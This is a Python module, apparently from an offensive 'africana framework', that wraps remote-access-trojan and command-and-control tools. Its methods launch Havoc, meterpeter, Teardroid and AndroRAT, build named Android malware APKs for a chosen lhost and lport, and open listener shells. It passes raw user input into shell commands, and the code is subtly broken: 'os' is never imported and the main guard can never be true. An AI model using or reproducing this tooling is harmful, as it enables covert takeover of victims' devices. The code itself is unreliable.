import sys
import time
import socket
import subprocess
from src.core.banner import *
from src.core.bcolors import *

class generator(object):
    def __init__(self):
        pass
    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def shellz(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/shells/; bash shells.py', shell = True).wait()
        return process

    def blackjack(self):
        a = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "lport" + bcolors.GREEN + ")# " + bcolors.ENDC)
        process = subprocess.Popen('cd src/externals/blackjack/; python3 BlackJack.py -s -n {0}'.format(a), shell = True).wait()
        return process

    def powerjoker(self):
        print("\n")
        subprocess.Popen('ip addr', shell = True).wait()
        ip = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "lhost" + bcolors.GREEN + ")# " + bcolors.ENDC)
        port = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "port" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        process = subprocess.Popen('cd src/externals/joker/; python3 joker.py -l {0} -p {1}'.format(ip, port), shell = True).wait()
        return process

    def meterpeter(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/meterpeter/; pwsh meterpeter.ps1', shell = True).wait()
        return process

    def havoc(self):
        os.system('clear')
        process = subprocess.Popen('havoc client & havoc server -d -v', shell = True).wait()
        return process

    def teardroid(self):
        malware = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "output name" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        process = subprocess.Popen('cd src/externals/Teardroid-phprat/; python3 Teardroid.py -b {0}'.format(malware), shell = True).wait()
        return process

    def androrat(self):
        print("\n")
        subprocess.Popen('ip addr', shell = True).wait()
        ip = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "lhost" + bcolors.YELLOW + "(%s)" %(rat.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
        port = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "lport" + bcolors.GREEN + ")# " + bcolors.ENDC)
        malware = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "give_name.of.output" + bcolors.GREEN + ")# " + bcolors.ENDC)

        os.system('clear')
        process = subprocess.Popen('cd src/externals/androrat/; python3 androRAT.py --build -i %s -p %s -o %s%s' %(ip, port, malware, ".apk"), shell = True).wait()
        process = subprocess.Popen('cd src/externals/androrat/; python3 androRAT.py --shell -i %s -p %s' %(ip, port), shell = True).wait()
        return process

rat = generator()

if ' __name__' == '__main__':
        sys.exit(rat())
